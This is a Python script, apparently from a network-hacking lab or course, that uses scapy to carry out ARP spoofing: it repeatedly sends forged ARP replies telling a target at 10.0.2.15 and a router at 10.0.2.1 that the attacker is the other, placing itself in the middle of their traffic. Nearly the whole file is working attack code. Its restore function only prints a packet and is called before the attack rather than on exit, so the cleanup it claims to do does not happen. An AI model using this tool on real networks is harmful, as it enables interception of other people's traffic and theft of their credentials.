#!/usr/bin/env python3

import scapy.all as scapy
import time
import subprocess


def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)                                  
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")                  
    arp_request_broadcast = broadcast/arp_request                       
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]      
    return answered_list[0][1].hwsrc
      

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)   # if no hwsrc is specified, scapy will use our own MAC
    scapy.send(packet, verbose=False)   # verbose=False removes the recurring print statement included with the function


def restore(destination_ip, source_ip):
    """ restore the ARP tables when the program exits """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    # print the packet details and summary
    print(packet.show())
    print(packet.summary())


# create a counter for packets sent
sent_packets_count = 0

# call the restore function
restore("10.0.2.15", "10.0.2.1")

# keep sending packets to spoof the target
# dynamically print the number of packets sent
try:
    while True:
        spoof("10.0.2.15", "10.0.2.1")  # tell the target that we are the router
        spoof("10.0.2.1", "10.0.2.15")  # tell the router that we are the target
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # print at line start and remove \n (python3 method)
        time.sleep(2)                   # create a 2 sec delay between packets to avoid flooding
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Quitting.")
    
